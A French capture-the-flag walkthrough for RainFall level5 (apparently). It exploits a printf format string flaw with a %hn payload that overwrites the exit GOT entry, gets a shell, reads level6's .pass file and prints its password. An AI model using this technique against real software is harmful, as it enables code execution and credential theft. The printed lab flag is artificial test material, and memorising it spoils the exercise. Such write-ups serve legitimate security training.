Nous remarquons que le programme utilise un fgets, puis met la sortie de fgets en premier argument du printf, ce qui est une faille de sécurité. Nous pouvons mettre une valeur de notre choix à certaines adresses, grâce à l'utilisation du flag %n.

L'assembleur nous montre l'adresse de la variable global qui contient l'adresse de exit, qui est linké dynamiquement.

```asm
080483d0 <exit@plt>:
 80483d0:	ff 25 38 98 04 08    	jmp    *0x8049838
 80483d6:	68 28 00 00 00       	push   $0x28
 80483db:	e9 90 ff ff ff       	jmp    8048370 <_init+0x3c>
```

Nous recherchons l'adresse de début du buffer à l'aide de printf.

```bash
level5@RainFall:~$ python -c 'print "BBBB" + 15 * "%p."' | ./level5 
aaaa0x200.0xb7fd1ac0.0xb7ff37d0.0x42424242.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.
```

L'adresse de la fonction "o" est `080484a4`. On calcule la partie haute/basse de l'adresse afin de la mettre dans la variable de linkage de exit.

```python
>>> 0x080484a4 >> 16
2052
>>> 0x080484a4 & 0xFFFF
33956
```

Ensuite, il nous suffit de stipuler l'adresse de la variable que l'on veut modifier, ainsi que son offset dans la stack et on remplit la partie haute de la variable afin d'y mettre la valeur de 2052. Et la partie basse de la variable, à la valeur de 33956.

```bash
level5@RainFall:~$ (python -c 'print "\x40\x98\x04\x08\x38\x98\x04\x08%2044x%4$hn%31904x%5$hn"';cat) | ./level5
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```
